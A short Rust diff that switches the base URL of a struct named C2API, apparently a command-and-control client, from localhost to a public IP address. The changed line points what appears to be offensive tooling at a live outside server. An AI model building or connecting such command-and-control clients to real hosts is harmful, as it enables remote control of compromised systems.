@@ -18,7 +18,7 @@ pub struct C2API {
 impl C2API {
     pub fn new() -> Self {
         C2API {
-            base_url: String::from_str("http://localhost:5000/api/").unwrap(),
+            base_url: String::from_str("http://82.66.179.79:5000/api/").unwrap(),
             api_client: reqwest::Client::new(),
         }
     }
